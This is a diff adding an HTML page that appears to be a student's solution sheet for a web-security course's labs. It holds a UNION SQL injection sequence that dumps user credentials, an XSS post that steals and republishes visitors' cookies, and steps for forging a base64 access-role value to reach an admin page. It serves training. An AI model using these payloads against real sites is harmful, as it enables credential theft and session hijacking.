@@ -1,0 +1,71 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+
+<head>
+<meta content="fi" http-equiv="Content-Language" />
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type" />
+<title>AWAS final project</title>
+</head>
+
+<body>
+<center>
+<div style="background-color:#40b254;height:20px;width:auto"></div>
+<p class="text-decamp">
+
+<img alt="Decamp Logo" height="117" src="DecampLogo.jpg" width="911" /></p>
+<h1>AWAS final project</h1>
+
+<h3>Laboratory 1: SQL injections</h3>
+
+<p>
+    Injection query sequence:
+</p>
+
+<p>
+    1. ' union select null,null,null, table_name,null,null from information_schema.tables where table_schema =database()# <br>
+    2. ' union select null,null,null, column_name,null,null from information_schema.columns where table_name ='users'# <br>
+    3. ' union select firstName,lastName,email,password,null,null from users# <br>
+</p>
+
+<h3>Laboratory 2: XSS vulnerability</h3>
+
+<p>
+    Possible post:
+</p>
+
+<p>
+    Topic: Presentation
+</p>
+
+<p>
+    Body: Hi everyone, I m a new member. <br><br>
+    script <br>
+        var x = 1; <br>
+        var x = document.getElementsByClassName("card-body"); <br>
+        for (i = 0; i < x.length; i++) { <br>
+           if(x[i].innerText == document.cookie){ <br>
+                x = 0; <br>
+           } <br>
+        } <br>
+        if(Boolean(x)){ <br>
+            document.getElementById("postSubject").value="Cookies"; <br>
+            document.getElementById("addressTA").value=document.cookie; <br>
+            document.getElementById("addPost").click(); <br>
+        } <br>
+    /script
+</p>
+
+<h3>Laboratory 3: Attacking Access Control</h3>
+
+<p>
+    1.	Register a new user and log into the application. <br>
+    2.	Go to accounts and inspect different users, looking at access role. <br>
+    3.	Logout and re-log in, look at URL, decode in base64 the access value and modify it. <br>
+    4.	Look for the Admin Page on the button menu and take the flag.    
+</p>
+
+
+</center>
+</body>
+
+</html>
